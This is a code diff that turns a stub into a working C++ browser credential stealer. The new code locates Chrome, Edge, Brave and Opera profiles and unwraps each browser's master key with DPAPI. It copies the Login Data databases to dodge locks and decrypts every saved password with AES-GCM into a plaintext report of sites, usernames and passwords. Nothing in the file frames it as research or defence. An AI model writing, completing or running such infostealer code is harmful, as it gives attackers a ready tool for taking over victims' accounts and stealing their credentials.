@@ -1,90 +1,160 @@
-#include "credential/ChromiumStealer.h"
-
-#include "crypto/Dpapi.h"
-#include "nlohmann/json.hpp"
-#include "sqlite3.h"
-
 #include <windows.h>
-#include <string>
-#include <vector>
+#include <shlobj.h>
 #include <filesystem>
 #include <fstream>
-#include <shlobj.h>
+#include <vector>
+#include <iostream>
+#include <wincrypt.h>
+
+#include "ChromiumStealer.h"
+#include "../crypto/Base64.h"
+#include "../crypto/AesGcm.h"
+#include "../external/nlohmann/json.hpp"
+#include "../external/sqlite3/sqlite3.h"
+
+#pragma comment(lib, "crypt32.lib")
 
 namespace credential {
 
-namespace {
+    namespace fs = std::filesystem;
 
-std::vector<BYTE> getMasterKey(const std::filesystem::path& path) {
-    std::ifstream file(path);
-    nlohmann::json json;
-    file >> json;
-    std::string encryptedKeyB64 = json["os_crypt"]["encrypted_key"];
-
-    // Base64 decode
-    DWORD decodedLen = 0;
-    CryptStringToBinaryA(encryptedKeyB64.c_str(), static_cast<DWORD>(encryptedKeyB64.length()), CRYPT_STRING_BASE64, NULL, &decodedLen, NULL, NULL);
-    std::vector<BYTE> encryptedKey(decodedLen);
-    CryptStringToBinaryA(encryptedKeyB64.c_str(), static_cast<DWORD>(encryptedKeyB64.length()), CRYPT_STRING_BASE64, encryptedKey.data(), &decodedLen, NULL, NULL);
-
-    // Remove "DPAPI" prefix
-    if (encryptedKey.size() > 5) {
-        encryptedKey.erase(encryptedKey.begin(), encryptedKey.begin() + 5);
-    }
-
-    return crypto::decryptDpapi(encryptedKey);
-}
-
-// Placeholder for AES decryption
-std::string decryptValue(const std::vector<BYTE>& /*value*/, const std::vector<BYTE>& /*masterKey*/) {
-    // TODO: Implement AES GCM decryption
-    return "decryption_placeholder";
-}
-
-} // namespace
-
-std::string stealChromium() {
-    std::string results;
-    PWSTR localAppDataPath;
-    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &localAppDataPath))) {
-        std::vector<std::filesystem::path> browserPaths = {
-            std::filesystem::path(localAppDataPath) / "Google\\Chrome\\User Data",
-            std::filesystem::path(localAppDataPath) / "Microsoft\\Edge\\User Data",
-        };
-        CoTaskMemFree(localAppDataPath);
-
-        for (const auto& browserPath : browserPaths) {
+    namespace {
+        std::vector<BYTE> GetMasterKey(const std::string& localStatePath) {
             try {
-                std::vector<BYTE> masterKey = getMasterKey(browserPath / "Local State");
+                std::ifstream f(localStatePath);
+                if (!f.is_open()) return {};
+                nlohmann::json j;
+                f >> j;
 
-                std::filesystem::path loginDataPath = browserPath / "Default" / "Login Data";
-                if (std::filesystem::exists(loginDataPath)) {
-                    sqlite3* db;
-                    if (sqlite3_open(loginDataPath.string().c_str(), &db) == SQLITE_OK) {
-                        sqlite3_stmt* stmt;
-                        if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, NULL) == SQLITE_OK) {
-                            while (sqlite3_step(stmt) == SQLITE_ROW) {
-                                std::string url = (const char*)sqlite3_column_text(stmt, 0);
-                                std::string username = (const char*)sqlite3_column_text(stmt, 1);
-                                const BYTE* encryptedPassword = (const BYTE*)sqlite3_column_blob(stmt, 2);
-                                int encryptedPasswordLen = sqlite3_column_bytes(stmt, 2);
+                std::string encryptedKeyB64 = j["os_crypt"]["encrypted_key"];
+                std::vector<BYTE> encryptedKey = crypto::Base64Decode(encryptedKeyB64);
 
-                                std::vector<BYTE> encryptedPasswordVec(encryptedPassword, encryptedPassword + encryptedPasswordLen);
-                                std::string password = decryptValue(encryptedPasswordVec, masterKey);
+                // Remove DPAPI prefix (5 bytes)
+                if (encryptedKey.size() < 5) return {};
+                std::vector<BYTE> dpapiEncryptedKey(encryptedKey.begin() + 5, encryptedKey.end());
 
-                                results += "URL: " + url + "\nUsername: " + username + "\nPassword: " + password + "\n\n";
-                            }
-                        }
-                        sqlite3_finalize(stmt);
-                    }
-                    sqlite3_close(db);
+                DATA_BLOB in;
+                in.pbData = dpapiEncryptedKey.data();
+                in.cbData = (DWORD)dpapiEncryptedKey.size();
+                DATA_BLOB out;
+
+                if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
+                    std::vector<BYTE> masterKey(out.pbData, out.pbData + out.cbData);
+                    LocalFree(out.pbData);
+                    return masterKey;
                 }
-            } catch (const std::exception&) {
-                // Ignore errors and continue
+            } catch (...) {
+            }
+            return {};
+        }
+
+        std::string DecryptPassword(const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& masterKey) {
+            try {
+                // Ciphertext structure: v10 (3 bytes) + IV (12 bytes) + EncryptedData + Tag (16 bytes)
+                if (ciphertext.size() < 3 + 12 + 16) return "";
+
+                // Check version
+                if (ciphertext[0] != 'v' || ciphertext[1] != '1' || ciphertext[2] != '0') return "";
+
+                std::vector<BYTE> iv(ciphertext.begin() + 3, ciphertext.begin() + 15);
+                std::vector<BYTE> encryptedData(ciphertext.begin() + 15, ciphertext.end() - 16); // Data without tag
+                // Note: AesGcm::decrypt expects ciphertext + tag combined for BCrypt if using valid implementation, 
+                // BUT the Windows BCrypt GCM implementation often takes Tag separately or appended.
+                // Our AesGcm::decrypt implementation:
+                // std::vector<BYTE> encryptedData(ciphertext.begin(), ciphertext.end() - 16);
+                // std::vector<BYTE> tag(ciphertext.end() - 16, ciphertext.end());
+                // So pass (EncryptedData + Tag)
+                
+                std::vector<BYTE> payloadToDecrypt(ciphertext.begin() + 15, ciphertext.end());
+
+                crypto::AesGcm aes(masterKey);
+                std::vector<BYTE> decrypted = aes.decrypt(payloadToDecrypt, iv);
+                return std::string(decrypted.begin(), decrypted.end());
+            } catch (...) {
+                return "";
             }
         }
     }
-    return results;
-}
 
-} // namespace credential
+    std::string DumpChromiumPasswords() {
+        std::string report = "BROWSER_CREDENTIALS:\n";
+        report += "URL                                      USERNAME             PASSWORD\n";
+        report += "--------------------------------------------------------------------------------\n";
+
+        char path[MAX_PATH];
+        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
+            std::string localAppData(path);
+            
+            struct BrowserPath {
+                std::string name;
+                std::string userDataPath;
+            };
+
+            std::vector<BrowserPath> browsers = {
+                {"Chrome", localAppData + "\\Google\\Chrome\\User Data"},
+                {"Edge", localAppData + "\\Microsoft\\Edge\\User Data"},
+                {"Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data"},
+                {"Opera", std::string(getenv("APPDATA")) + "\\Opera Software\\Opera Stable"}
+            };
+
+            for (const auto& browser : browsers) {
+                if (!fs::exists(browser.userDataPath)) continue;
+
+                std::string localState = browser.userDataPath + "\\Local State";
+                std::vector<BYTE> key = GetMasterKey(localState);
+                if (key.empty()) continue;
+
+                // Recursively find "Login Data" to catch all profiles
+                try {
+                    for (auto it = fs::recursive_directory_iterator(browser.userDataPath); it != fs::recursive_directory_iterator(); ++it) {
+                        const auto& entry = *it;
+                        if (entry.path().filename() == "Login Data") {
+                            std::string loginData = entry.path().string();
+                            
+                            // Copy to temp to avoid locks
+                            char tempPath[MAX_PATH];
+                            GetTempPathA(MAX_PATH, tempPath);
+                            std::string tempDb = std::string(tempPath) + "temp_login_db_" + browser.name + "_" + std::to_string(GetTickCount());
+                            CopyFileA(loginData.c_str(), tempDb.c_str(), FALSE);
+
+                            sqlite3* db;
+                            if (sqlite3_open(tempDb.c_str(), &db) == SQLITE_OK) {
+                                const char* query = "SELECT origin_url, username_value, password_value FROM logins";
+                                sqlite3_stmt* stmt;
+                                if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
+                                    while (sqlite3_step(stmt) == SQLITE_ROW) {
+                                        const char* url_ptr = (const char*)sqlite3_column_text(stmt, 0);
+                                        const char* user_ptr = (const char*)sqlite3_column_text(stmt, 1);
+                                        if (!url_ptr || !user_ptr) continue;
+
+                                        std::string url = url_ptr;
+                                        std::string username = user_ptr;
+                                        const void* blob = sqlite3_column_blob(stmt, 2);
+                                        int blobLen = sqlite3_column_bytes(stmt, 2);
+                                        
+                                        if (blobLen > 0) {
+                                            std::vector<BYTE> encryptedPass((BYTE*)blob, (BYTE*)blob + blobLen);
+                                            std::string password = DecryptPassword(encryptedPass, key);
+
+                                            if (!password.empty() && !username.empty()) {
+                                                report += browser.name + " | " + url + " | " + username + " | " + password + "\n";
+                                            }
+                                        }
+                                    }
+                                    sqlite3_finalize(stmt);
+                                }
+                                sqlite3_close(db);
+                            }
+                            DeleteFileA(tempDb.c_str());
+                        }
+                        // Limit depth to avoid scanning everything
+                        if (it.depth() > 3) it.disable_recursion_pending();
+                    }
+                } catch (...) {}
+            }
+        }
+
+        return report;
+    }
+
+}
